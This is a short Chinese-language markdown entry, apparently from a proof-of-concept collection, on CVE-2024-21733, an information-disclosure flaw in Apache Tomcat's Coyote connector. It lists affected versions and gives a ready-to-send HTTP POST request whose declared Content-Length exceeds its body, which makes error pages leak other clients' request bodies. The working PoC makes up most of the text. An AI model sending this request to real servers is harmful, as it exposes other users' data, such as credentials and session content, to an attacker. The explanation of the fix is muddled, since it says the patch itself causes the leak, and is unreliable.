## Apache Tomcat存在信息泄露漏洞( CVE-2024-21733)

Apache Tomcat 信息泄露漏洞（CVE-2024-21733）情报。Apache Tomcat 是一个开源 Java Servlet 容器和 Web 服务器，用于运行 Java 应用程序和动态网页。Coyote 是 Tomcat 的连接器，处理来自客户端的请求并将它们传递Tomcat 引擎进行处理。攻击者可以通过构造特定请求，在异常页面中输出其他请求的body 数据,修复版本中通过增加 finally 代码块,保证默认会重设缓冲区 position 和 limit 到一致的状态，从而造成信息泄露。


## 影响版本
```
从8.5.7到8.5.63
9.0.0-M11到9.0.43
```


## poc
```
POST / HTTP/1.1
Host: hostname
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Length: 6
Content-Type: application/x-www-form-urlencoded

X
```

![image](https://github.com/wy876/POC/assets/139549762/15933e83-bb51-4d91-ba49-c31ab8d27cdb)

